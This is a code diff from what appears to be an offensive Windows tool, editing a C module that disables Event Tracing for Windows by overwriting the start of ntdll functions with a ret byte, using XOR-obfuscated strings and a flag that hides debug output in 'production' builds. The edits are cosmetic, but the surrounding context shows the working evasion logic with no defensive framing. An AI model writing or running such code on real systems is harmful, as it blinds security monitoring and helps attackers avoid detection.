@@ -8,13 +8,13 @@
 #include "obfuscation.h"
 #include "syscalls.h"
 
-// Patches ETW function by writing 0xC3 (ret) at start
+// Patches ETW function by writing 0xC3 (ret) at the start
 BOOL PatchETWFunction(const char* functionName) {
     #ifndef PRODUCTION
     printf("[*] Patching %s...\n", functionName);
     #endif
     
-    // Obfuscated "ntdll.dll" (XOR 0x42)
+    // Obfuscated "ntdll.dll" (XOR with 0x42)
     BYTE obfNtdllName[] = {0x2C, 0x36, 0x26, 0x2E, 0x2E, 0x6C, 0x26, 0x2E, 0x2E};
     char ntdll[16];
     DeobfuscateString(obfNtdllName, 9, 0x42, ntdll);
@@ -48,7 +48,7 @@ BOOL PatchETWFunction(const char* functionName) {
         return FALSE;
     }
     
-    // Write patch: ret (0xC3)
+    // Write patch: ret
     *(BYTE*)pFunction = 0xC3;
     
     #ifndef PRODUCTION
@@ -70,13 +70,11 @@ BOOL DisableETW(ETW_RESULT* result) {
     printf("\n");
     #endif
     #ifndef PRODUCTION
-    printf("╔══════════════════════════════════════════════════════╗\n");
     #endif
     #ifndef PRODUCTION
-    printf("║       ETW BYPASS                                      ║\n");
+    printf("ETW BYPASS\n");
     #endif
     #ifndef PRODUCTION
-    printf("╚══════════════════════════════════════════════════════╝\n\n");
     #endif
     
     result->success = FALSE;
@@ -101,13 +99,11 @@ void PrintETWResult(ETW_RESULT* result) {
     printf("\n");
     #endif
     #ifndef PRODUCTION
-    printf("╔══════════════════════════════════════════════════════╗\n");
     #endif
     #ifndef PRODUCTION
-    printf("║       ETW BYPASS RESULT                               ║\n");
+    printf("ETW BYPASS RESULT\n");
     #endif
     #ifndef PRODUCTION
-    printf("╚══════════════════════════════════════════════════════╝\n\n");
     #endif
     
     if (result->success) {
